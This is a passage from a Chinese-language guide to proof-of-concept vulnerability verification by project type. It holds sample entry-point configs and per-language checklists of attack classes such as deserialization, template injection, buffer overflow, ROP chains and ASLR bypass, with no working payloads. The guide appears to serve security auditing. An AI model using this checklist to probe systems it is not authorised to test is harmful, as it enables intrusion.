      type: 'http',
      path: '/render',
      method: 'GET',
      params: ['template']
    }
  ]
};

// C/C++ 项目示例
const cppConfig = {
  projectType: 'cpp-app',
  baseUrl: 'http://localhost:8080',
  entryPoints: [
    {
      type: 'binary',
      path: '/opt/app/vulnerable',
      args: ['input'],
      binary: true
    }
  ]
};

// Swift 项目示例
const swiftConfig = {
  projectType: 'swift-app',
  baseUrl: 'http://localhost:8080',
  entryPoints: [
    {
      type: 'ipc',
      path: '/api/command',
      method: 'POST',
      body: ['command']
    },
    {
      type: 'http',
      path: '/webview',
      method: 'GET',
      params: ['html']
    }
  ]
};
```

---

## 最佳实践

### 1. 先识别，后验证

**错误做法**：
```
发现项目后，直接用通用 PoC 验证
```

**正确做法**：
```
1. Phase 0: 识别项目类型
2. 根据类型选择验证策略
3. 定制化编写 PoC
4. 执行验证
```

### 2. 优先验证入口点

**优先级**：
1. 配置文件（package.json、pom.xml）
2. 入口点文件（extension.ts、main.ts）
3. 命令处理器
4. 路由处理器
5. 业务逻辑代码

### 3. 完整覆盖所有攻击面

**通用检查清单**：
- [ ] 命令注入
- [ ] 路径遍历
- [ ] SQL 注入
- [ ] XSS
- [ ] 文件上传
- [ ] 反序列化
- [ ] CSRF
- [ ] 信息泄露
- [ ] 权限绕过

**Java 特有检查清单**：
- [ ] SpEL 注入（Spring Expression Language）
- [ ] OGNL 注入（Struts2）
- [ ] EL 注入（Expression Language）
- [ ] JNI 注入
- [ ] JNDI 注入
- [ ] XMLDecoder 反序列化
- [ ] Fastjson/Jackson 反序列化
- [ ] RMI 反序列化
- [ ] JMX 远程代码执行

**PHP 特有检查清单**：
- [ ] 文件包含（LFI/RFI）
- [ ] PHP 伪协议利用（php://filter, php://input）
- [ ] 反序列化（unserialize）
- [ ] Phar 反序列化
- [ ] 类型混淆（Type Juggling）
- [ ] SSRF（Server-Side Request Forgery）
- [ ] XXE（XML External Entity）

**Python 特有检查清单**：
- [ ] Pickle 反序列化
- [ ] Jinja2/SSTI 模板注入
- [ ] eval/exec 代码注入
- [ ] import 路径劫持
- [ ] PyYAML 反序列化
- [ ] Django 模板注入
- [ ] Flask 模板注入

**Go 特有检查清单**：
- [ ] 模板注入（text/template, html/template）
- [ ] unsafe 包使用
- [ ] cgo 注入
- [ ] 反射注入
- [ ] 竞态条件（Race Condition）

**Rust 特有检查清单**：
- [ ] unsafe 块使用
- [ ] FFI 注入（Foreign Function Interface）
- [ ] 模板注入（handlebars, tera）
- [ ] 反序列化（serde）
- [ ] 并发竞态条件

**Ruby 特有检查清单**：
- [ ] YAML 反序列化
- [ ] ERB 模板注入
- [ ] HAML 模板注入
- [ ] 反序列化（Marshal）
- [ ] open() 命令注入
- [ ] system() 命令注入

**C/C++ 特有检查清单**：
- [ ] 缓冲区溢出（Stack/Heap）
- [ ] 格式化字符串（Format String）
- [ ] 整数溢出
- [ ] Use After Free（UAF）
- [ ] 双重释放（Double Free）
- [ ] 堆喷射（Heap Spray）
- [ ] ROP 链构造
- [ ] 栈金丝雀绕过
- [ ] ASLR 绕过
- [ ] NX 绕过

**Swift 特有检查清单**：
- [ ] CoreData SQL 注入
- [ ] WebView XSS
- [ ] IPC 注入
- [ ] URL Scheme 劫持
- [ ] 越狱检测绕过
- [ ] Keychain 数据泄露
- [ ] plist 注入

### 4. 真实环境验证

**不要只在代码层面分析**：
```
1. 启动真实环境
2. 执行真实 PoC
3. 监控真实行为
4. 记录真实证据
```

### 5. 记录完整证据链

**证据链包括**：
1. 漏洞代码位置
2. 恶意输入构造
3. 执行流程追踪
4. 结果验证截图
5. 日志文件

---

## 总结

基于项目类型的 PoC 验证策略的核心原则：

1. **不要一概而论** - 不同项目类型需要不同的验证方法
2. **先识别后验证** - Phase 0 必须先识别项目类型
3. **语言特性优先** - 不同语言有不同的漏洞类型和验证方法
4. **入口点优先** - 优先审计和验证入口点
5. **真实环境验证** - 不要只在代码层面分析
6. **完整证据链** - 记录从漏洞到利用的完整路径

### 支持的编程语言

本文档覆盖了以下编程语言的 PoC 验证策略：

- **Java**：SQL 注入、反序列化、反射注入、SpEL 注入
- **PHP**：SQL 注入、文件包含、命令注入、反序列化
- **Python**：Pickle 反序列化、Jinja2 SSTI、命令注入
- **Go**：SQL 注入、模板注入、路径遍历、命令注入
- **Rust**：SQL 注入、命令注入、路径遍历
- **Ruby**：YAML 反序列化、ERB SSTI、命令注入
- **C/C++**：缓冲区溢出、格式化字符串、整数溢出、UAF
- **Swift**：CoreData SQL 注入、WebView XSS、IPC 注入
- **Node.js**：命令注入、路径遍历、WebView XSS（VSCode/Electron）

### 多语言项目识别规则

```
Java：pom.xml, build.gradle, build.gradle.kts
PHP：composer.json, composer.lock
Python：requirements.txt, setup.py, pyproject.toml
Go：go.mod, go.sum
Rust：Cargo.toml, Cargo.lock
Ruby：Gemfile, Gemfile.lock
C/C++：Makefile, CMakeLists.txt, Makefile.am
Swift：Package.swift, Podfile
Node.js：package.json, package-lock.json
```

通过遵循这些原则，可以确保 PoC 验证的准确性和完整性，避免遗漏任何潜在的漏洞。
